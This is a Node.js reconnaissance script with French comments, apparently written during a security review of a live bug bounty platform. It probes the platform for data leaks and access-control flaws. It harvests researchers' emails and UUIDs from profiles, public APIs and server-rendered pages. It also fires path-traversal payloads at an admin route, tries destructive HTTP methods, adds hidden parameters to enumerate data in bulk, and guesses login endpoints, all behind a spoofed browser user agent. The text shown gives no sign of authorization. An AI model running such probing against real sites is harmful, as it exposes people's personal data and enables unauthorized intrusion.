// CYBERAAR - MES PROPRES ANGLES (au-dela des techniques proposees par les revues)
//  1) le profil public /h/<handle> : que revele-t-il ? (email, activite, paiements, rapports)
//  2) l API derriere ce profil : y a-t-il un IDOR sur des champs prives ?
//  3) les endpoints publics (leaderboard/stats/programmes) : JSON complet = fuite ?
//  4) les pages SSR : le HTML embauche-t-il PLUS que l API ne renvoie ? (fuite de donnees au rendu)
//  5) normalisation de chemin et confusion de methode sur /api/aarme/* (variantes non destructives)
//  6) parametres caches sur les endpoints publics (limit/offset/include/all/email) -> enumeration de masse
//  7) decouverte de l endpoint de connexion (Astro action ou /api/aarme/account/login)
//  8) le "level" auto-declare a l inscription : a-t-il un effet ?
// Rythme : 1 requete / 2 s, backoff si 429.
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const SITE = "https://cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const log = [];
let backoff = 2000;
async function req(url, o = {}) {
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(url, { method: o.m || "GET", headers: { "User-Agent": UA, Accept: o.accept || "*/*", ...(o.h || {}) }, redirect: "manual", signal: AbortSignal.timeout(25000) });
      const txt = await r.text();
      const rec = { url, m: o.m || "GET", s: r.status, ct: r.headers.get("content-type") || "", len: txt.length, body: txt.slice(0, 3000) };
      log.push(rec);
      if (r.status === 429) { backoff = Math.min(backoff * 2, 60000); await sleep(backoff); continue; }
      backoff = 2000;
      return { ...rec, txt: txt };
    } catch (e) { await sleep(3000); }
  }
  return { s: 0, txt: "", body: "ERR" };
}
const show = (l, r) => console.log("  " + l.padEnd(50) + "HTTP " + r.s + " " + String(r.len || 0).padStart(7) + "  " + (r.body || "").replace(/\s+/g, " ").slice(0, 110));
const clean = (s) => s.replace(/<script[\s\S]*?<\/script>/gi, " ").replace(/<style[\s\S]*?<\/style>/gi, " ").replace(/<[^>]+>/g, " ").replace(/\s+/g, " ");

console.log("=== 1) le profil public d un chercheur (handle tire du leaderboard) ===");
const lb = await req(APP + "/api/aarme/leaderboard", { accept: "application/json" });
let handles = [];
try { handles = JSON.parse(lb.txt).leaderboard.map((x) => x.handle).filter(Boolean).slice(0, 3); } catch {}
console.log("  handles :", handles.join(", "));
if (handles[0]) {
  const prof = await req(APP + "/h/" + handles[0]);
  show("/h/" + handles[0], prof);
  const t = clean(prof.txt);
  const emails = [...new Set(t.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g) || [])];
  const uuids = [...new Set(t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi) || [])];
  console.log("      emails dans le HTML :", emails.join(", ") || "(aucun)");
  console.log("      uuid dans le HTML   :", uuids.slice(0, 6).join(", ") || "(aucun)");
  const kib = t.match(/paiement|gagné|earned|revenu|montant|FCFA|XOF|total/i);
  console.log("      indices de revenu :", kib ? kib[0] : "(aucun)");
  // (2) l API du profil
  for (const p of ["/api/aarme/h/" + handles[0], "/api/aarme/researcher/" + handles[0], "/api/aarme/hackers/" + handles[0], "/api/aarme/handle/" + handles[0], "/api/aarme/user/" + handles[0], "/api/aarme/leaderboard?handle=" + handles[0]]) {
    const r = await req(APP + p, { accept: "application/json" });
    show(p, r);
    await sleep(200);
  }
}

console.log("\n=== 3) endpoints publics : JSON complet (des donnees sensibles ?) ===");
for (const p of ["/api/aarme/leaderboard", "/api/aarme/stats", "/api/aarme/programmes"]) {
  const r = await req(APP + p, { accept: "application/json" });
  show(p, r);
  const emails = [...new Set((r.txt || "").match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g) || [])];
  const uuids = [...new Set((r.txt || "").match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi) || [])];
  if (emails.length) console.log("      EMAILS :", emails.slice(0, 10).join(", "));
  if (uuids.length) console.log("      UUIDs  :", uuids.slice(0, 8).join(", "));
  fs.writeFileSync("/tmp/opencode/cyberaar/public-" + p.split("/").pop() + ".json", r.txt || "");
  await sleep(200);
}

console.log("\n=== 4) pages SSR : le HTML embauche-t-il plus que l API ? ===");
for (const p of ["/palmares/", "/en/hall-of-fame/", "/organisations/", "/en/organisations/", "/compte/", "/soumettre/"]) {
  const r = await req(APP + p, { accept: "text/html" });
  const t = r.txt || "";
  const emails = [...new Set((t.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g) || []))];
  const uuids = [...new Set((t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi) || []))];
  console.log("  " + p.padEnd(26) + "HTTP " + r.s + " " + String(t.length).padStart(7) + " car. | emails: " + (emails.slice(0, 4).join(",") || "-") + " | uuid: " + uuids.slice(0, 3).join(","));
  if (emails.length) console.log("      >>> EMAILS DANS LE HTML : " + emails.slice(0, 12).join(" , "));
  await sleep(300);
}

console.log("\n=== 5) normalisation de chemin + confusion de methode (variantes non destructives) ===");
const NORM = [
  "/api/aarme/account/session/../../aarme/admin",
  "/api/aarme/./account/session",
  "/api/aarme//account/session",
  "/api/aarme/account/session%2f..%2f..%2fadmin",
  "/API/AARME/ACCOUNT/SESSION",
  "/api/aarme/account/session/",
  "/api/aarme/account/session?x=1",
  "//api.aarme.cyberaar.io/api/aarme/account/session",
];
for (const p of NORM) { const r = await req(APP + p, { accept: "application/json" }); show(p, r); await sleep(200); }
for (const [l, o] of [["OPTIONS /api/aarme/account/session", { m: "OPTIONS" }], ["HEAD /api/aarme/stats", { m: "HEAD" }], ["PUT /api/aarme/account/session", { m: "PUT" }], ["PATCH /api/aarme/stats", { m: "PATCH" }], ["DELETE /api/aarme/stats", { m: "DELETE" }], ["POST /api/aarme/stats (methode invalide)", { m: "POST" }]]) {
  const r = await req(APP + "/api/aarme/" + l.split(" ")[1].replace("/api/aarme/", ""), { ...o, accept: "application/json" });
  show(l, r);
  await sleep(200);
}

console.log("\n=== 6) parametres caches sur les endpoints publics (enumeration) ===");
for (const p of ["/api/aarme/leaderboard?limit=1000", "/api/aarme/leaderboard?all=true", "/api/aarme/leaderboard?include=email", "/api/aarme/stats?verbose=true", "/api/aarme/stats?debug=1", "/api/aarme/programmes?all=true", "/api/aarme/programmes?include=internal"]) {
  const r = await req(APP + p, { accept: "application/json" });
  show(p, r);
  await sleep(200);
}

console.log("\n=== 7) decouverte de l endpoint de connexion (Astro action / API) ===");
for (const p of ["/api/aarme/account/login", "/api/aarme/account/signin", "/api/aarme/login", "/api/aarme/auth", "/api/aarme/session", "/_actions/login", "/_actions/signIn", "/_actions/auth", "/api/aarme/account/verify", "/api/aarme/account/forgot", "/api/aarme/account/reset"]) {
  const r = await req(APP + p, { accept: "application/json" });
  show(p, r);
  await sleep(200);
}

fs.writeFileSync("/tmp/opencode/cyberaar/my-angles.json", JSON.stringify(log, null, 1));
console.log("\n-> /tmp/opencode/cyberaar/my-angles.json (" + log.length + " requetes)");
